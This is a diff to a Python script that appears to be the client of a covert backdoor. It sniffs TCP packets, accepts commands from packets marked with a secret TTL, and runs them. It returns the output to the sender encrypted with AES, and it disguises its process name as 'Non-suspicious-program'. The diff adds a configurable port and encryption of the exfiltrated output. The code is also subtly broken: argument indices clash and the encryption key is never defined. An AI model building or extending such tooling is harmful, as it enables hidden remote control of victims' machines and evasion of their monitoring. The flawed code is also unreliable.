@@ -36,27 +36,31 @@ global listening
 global ttlKey
 global decryptionKey
 global IV
+global dstPort
 
 def usage():
     global ttlKey
     global decryptionKey
     global IV
+    global dstPort
     if len(sys.argv) < 4:
-        print "Please use format python client.py <ttlkey> <decryptionKey> <IV>"
+        print "Please use format python client.py <dstPort> <ttlkey> <decryptionKey> <IV>"
         sys.exit()
     else:
-        if len(sys.argv[2]) < 16:
+        if len(sys.argv[3]) < 16:
             print "Please ensure decryption key is 16 characters in length"
             sys.exit()
-        if len(sys.argv[3]) < 16:
+        if len(sys.argv[4]) < 16:
             print "Please ensure that the IV is 16 characters in legnth"
             sys.exit()
         global ttlKey
+        dstPort = sys.argv[4]
+        print "dstPort is " + str(dstPort)
         ttlKey  = int(sys.argv[1])
         print "ttlKey is " + str(ttlKey)
-        decryptionKey = sys.argv[2]
+        decryptionKey = sys.argv[3]
         print "Decryption key is " + decryptionKey
-        IV = sys.argv[3]
+        IV = sys.argv[4]
         print "IV is " + IV
 
 '''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
@@ -84,6 +88,28 @@ def decryptCommand(command):
 
 '''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
 --  FUNCTION
+--  Name:       encryptCommand
+--  Parameters:
+--      String
+--          The user's command string to added into the packet payload
+--  Return Values:
+--      Encrypted command string
+--  Description:
+--      Function encrypts the plaintext command entered by user using PyCrypto.
+--      Encrypted with AES CFB.
+'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
+def encryptCommand(command):
+    global encryptionKey
+    global ttlKey
+    encryptionKey = encryptionKey
+    ttlKey = ttlKey
+    # key='0123456789abcdef'
+    # IV = "abcdefghijklmnop"
+    encryptor = AES.new(encryptionKey,AES.MODE_CFB,IV=IV)
+    return encryptor.encrypt(command)
+
+'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
+--  FUNCTION
 --  Name:       receivedPacket
 --  Parameters:
 --     String
@@ -97,6 +123,7 @@ def decryptCommand(command):
 '''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
 def receivedPacket(packet):
     global ttlKey
+    global dstPort
     if IP in packet[0]:
         #Authenticate that the packets are actually from the attacker
         # Key is TTL 71
@@ -109,7 +136,7 @@ def receivedPacket(packet):
             result = f.read()
             if result == "":
                 result = "ERROR or No Output Produced"
-            newPacket = (IP(dst=srcIP, ttl=ttlKey)/TCP(sport=80, dport=srcPort)/result)
+            newPacket = (IP(dst=srcIP, ttl=ttlKey)/TCP(sport=dstPort, dport=srcPort)/encryptCommand(result))
             send(newPacket, verbose = False)
             return True
         else:
@@ -117,6 +144,7 @@ def receivedPacket(packet):
 
 
 if __name__ == "__main__":
+    global dstPort
     usage()
     #Set process title to something less suspicious
     setproctitle.setproctitle("Non-suspicious-program")
@@ -124,4 +152,4 @@ if __name__ == "__main__":
     #Listen for connections
     listening = True;
     while listening:
-        sniff(filter='tcp and dst port 80', stop_filter=receivedPacket)
+        sniff(filter='tcp and dst port '+dstPort, stop_filter=receivedPacket)
